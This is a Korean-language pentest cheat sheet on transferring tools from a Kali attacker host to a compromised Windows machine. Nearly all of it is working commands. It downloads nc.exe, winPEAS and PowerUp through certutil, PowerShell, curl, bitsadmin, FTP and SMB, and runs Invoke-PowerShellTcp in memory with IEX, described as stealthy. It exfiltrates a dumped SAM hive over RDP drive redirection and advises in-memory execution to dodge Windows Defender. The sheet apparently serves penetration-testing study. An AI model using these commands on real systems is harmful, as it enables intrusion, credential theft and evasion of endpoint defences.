# Linux_to_Windows

# 파일전송 — Linux → Windows

---

## 공격자 측 서버 준비

```bash
# HTTP
python3 -m http.server 80

# SMB (인증 없이)
impacket-smbserver share $(pwd) -smb2support

# SMB (인증 추가 — Win10+에서 필요할 수 있음)
impacket-smbserver share $(pwd) -smb2support -user kali -password kali

# FTP
sudo python3 -m pyftpdlib -p 21 -w
```

---

## certutil (모든 Windows, 가장 보편적)

```bash
certutil -urlcache -split -f "http://<칼리IP>/nc.exe" C:\Temp\nc.exe
certutil -urlcache -split -f "http://<칼리IP>/winPEASx64.exe" C:\Temp\winPEAS.exe

:: base64 파일 다운로드 후 디코딩
certutil -urlcache -split -f "http://<칼리IP>/shell.b64" C:\Temp\shell.b64
certutil -decode C:\Temp\shell.b64 C:\Temp\shell.exe
```

---

## PowerShell

```powershell
# WebClient (가장 호환성 좋음)
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<칼리IP>/nc.exe','C:\Temp\nc.exe')"

# Invoke-WebRequest (PS3+)
iwr http://<칼리IP>/winPEASx64.exe -OutFile C:\Temp\winPEAS.exe
Invoke-WebRequest -Uri http://<칼리IP>/nc.exe -OutFile C:\Temp\nc.exe

# 메모리 실행 (파일 저장 없음 — 스텔스)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/PowerUp.ps1')"
IEX(New-Object Net.WebClient).DownloadString('http://<칼리IP>/Invoke-PowerShellTcp.ps1')
```

---

## curl.exe (Win10 / Server 2019 이상)

```bash
curl http://<칼리IP>/nc.exe -o C:\Temp\nc.exe
curl http://<칼리IP>/winPEAS.exe -o C:\Temp\winPEAS.exe
```

---

## SMB 경유 (복사 없이 직접 실행 가능)

```bash
:: 복사
copy \\<칼리IP>\share\nc.exe C:\Temp\

:: 공유 매핑 후 사용
net use Z: \\<칼리IP>\share
Z:\winPEASx64.exe

:: 직접 실행(복사 없이)
\\<칼리IP>\share\nc.exe
\\<칼리IP>\share\winPEASx64.exe
```

---

## bitsadmin (구버전 Windows)

```bash
bitsadmin /transfer myJob /download /priority normal http://<칼리IP>/nc.exe C:\Temp\nc.exe
```

---

## FTP 스크립트 (비대화형 환경)

```bash
echo open <칼리IP> 21 > ftp.txt
echo USER anonymous>> ftp.txt
echo anonymous>> ftp.txt
echo bin>> ftp.txt
echo GET nc.exe>> ftp.txt
echo bye>> ftp.txt
ftp -v -n -s:ftp.txt
```

---

## RDP 드라이브 리다이렉션 (GUI 세션 안에서 파일 공유)

WinRM/SMB가 막혀있고 RDP만 되는 계정일 때 유용하다. 접속 시적으로 로컬 폴더를 지정해주면, 원격 세션 안에서 그 폴더가 네트워크 드라이브처럼 마운트된다.

```bash
# 칼리에서 접속할 때 드라이브 지정
xfreerdp /v:<대상IP> /u:<유저> /p:'<비번>' /cert:ignore /drive:<공유명>,<로컬경로>
# 예: /drive:kali,/home/user  -> 원격에서 \\tsclient\kali 로 보임

# 클립보드 공유도 필요하면 +clipboard 추가
xfreerdp /v:<대상IP> /u:<유저> /p:'<비번>' /cert:ignore /drive:kali,/home/user +clipboard
```

```powershell
# 원격(윈도우) 세션 안에서 확인
net use
# \\TSCLIENT\kali 가 보이면 정상

# 파일 복사 (칼리 -> 윈도우)
copy \\tsclient\kali\nc.exe C:\Windows\Temp\nc.exe

# 반대로 윈도우 -> 칼리로 뿑아내기도 가능 (덤프한 파일 반출 등)
copy C:\Windows\Temp\sam.hive \\tsclient\kali\
```

주의: RDP GUI 창에 복붙여넣기가 안 될 때(클립보드 리다이렉션 미설정)도 이 드라이브 리다이렉션으로 우회 가능하다 — 치명적인 명령어는 타이핑하고, 긴 파일(mimikatz.exe 등)만 이 방식으로 올린다.

주의 2: `\\tsclient\<공유명>` 경로는 **대소문자를 구분**한다. `/drive:kali,...`로 소문자로 지정했으면 윈도우 쪽에서도 `\\tsclient\kali`로(대문자 아님) 정확히 접근해야 한다 — 대문자로 치면 파일을 못 찾는 경우가 있다.

---

## 팁

- PowerShell 막혀있으면: `certutil → curl.exe → bitsadmin` 순으로 시도
- SMB 공유가 가장 빠름 (복사 없이 직접 실행 가능)
- Windows Defender 탐지 시 메모리 실행(IEX) 활용